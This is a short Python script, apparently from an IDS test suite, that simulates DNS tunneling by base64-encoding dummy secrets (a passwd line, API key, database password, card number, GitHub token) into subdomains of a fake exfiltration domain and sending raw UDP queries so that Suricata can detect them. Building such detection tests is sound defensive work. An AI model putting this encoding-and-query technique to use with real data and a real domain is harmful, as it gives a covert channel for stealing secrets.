import socket
import base64
import time
import sys

def run_dns_tunneling(dns_server="127.0.0.1", count=6):
    print(f"\n[*] [ATTACK 5] Starting DNS Data Exfiltration / Tunneling Simulation ({count} queries)...")
    
    stolen_chunks = [
        "passwd:root:x:0:0:root:/root:/bin/bash",
        "api_key:sk-live-99a8b7c6d5e4f3a2b1c0",
        "db_pass:SuperSecretCorporateProdDatabase2026",
        "credit_card:4111222233334444:exp:12/28",
        "private_token:ghp_abcdefghijklmnopqrstuvwxyz123456",
        "internal_ip_map:10.0.0.1,10.0.0.2,10.0.0.5"
    ]

    for i, secret in enumerate(stolen_chunks[:count], 1):
        encoded = base64.b64encode(secret.encode()).decode().replace('=', '')
        fake_domain = f"{encoded[:35]}.tunnel.exfiltration.threat.internal"
        print(f"    [DNS EXFIL {i}/{count}] Querying encoded domain -> {fake_domain}")
        try:
            # Send raw UDP DNS query packet to trigger Suricata DNS inspection
            # Standard DNS header: ID=0x1234, Flags=0x0100 (Standard query), QDCOUNT=1
            query = bytearray()
            query.extend(b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00')
            for part in fake_domain.split('.'):
                query.append(len(part))
                query.extend(part.encode())
            query.append(0) # Null terminator
            query.extend(b'\x00\x01\x00\x01') # Type A, Class IN
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.5)
            sock.sendto(query, (dns_server, 53))
            sock.close()
        except Exception as e:
            pass # We don't care if there's no live DNS resolver; Suricata sniffs the outbound request
        time.sleep(0.4)
        
    print("[+] DNS tunneling simulation complete.\n")

if __name__ == "__main__":
    server = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    run_dns_tunneling(server)
